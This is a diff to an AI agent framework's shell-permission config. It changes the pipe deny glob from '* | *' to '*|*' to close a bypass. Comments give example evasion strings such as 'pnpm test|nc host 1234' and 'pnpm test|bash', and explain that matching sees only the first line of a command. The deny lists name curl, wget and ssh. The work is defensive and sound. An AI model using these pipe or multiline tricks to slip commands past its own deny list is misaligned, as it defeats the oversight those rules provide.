@@ -108,6 +108,17 @@ path_scopes:
 # isShellCommandAllowed. Deny always wins over allow. A minion with NO entry
 # here has shell access denied entirely -- there is no implicit allow, and no
 # minion other than code_writer/test_writer is granted shell.execute above.
+#
+# Pattern notes (M5 review B1): deny patterns are picomatch globs where `*`
+# spans any characters (config.ts compiles with {bash:true} and escapes the
+# literal `|`). Write pipe/redirect denies with NO surrounding spaces --
+# "*|*" and "*>*", NOT "* | *" -- so they catch unspaced forms like
+# "pnpm test|bash" and "pnpm test|nc host 1234", not just the fully-spaced
+# " | " form (a space-requiring "* | *" was a live pipe-to-arbitrary-command
+# bypass; see the Decision Log CORRECTION). Matching only ever sees the FIRST
+# line of the command (bash `*` does not span a newline), so allow patterns
+# must never be widened to tolerate multiline input, or a second line could
+# slip past the deny list unexamined.
 shell_commands:
   code_writer:
     allow:
@@ -118,7 +129,7 @@ shell_commands:
       - "git status"
       - "git log*"
     deny:
-      - "* | *"
+      - "*|*"
       - "*curl*"
       - "*wget*"
       - "*ssh*"
@@ -134,7 +145,7 @@ shell_commands:
       - "git status"
       - "git log*"
     deny:
-      - "* | *"
+      - "*|*"
       - "*curl*"
       - "*wget*"
       - "*ssh*"
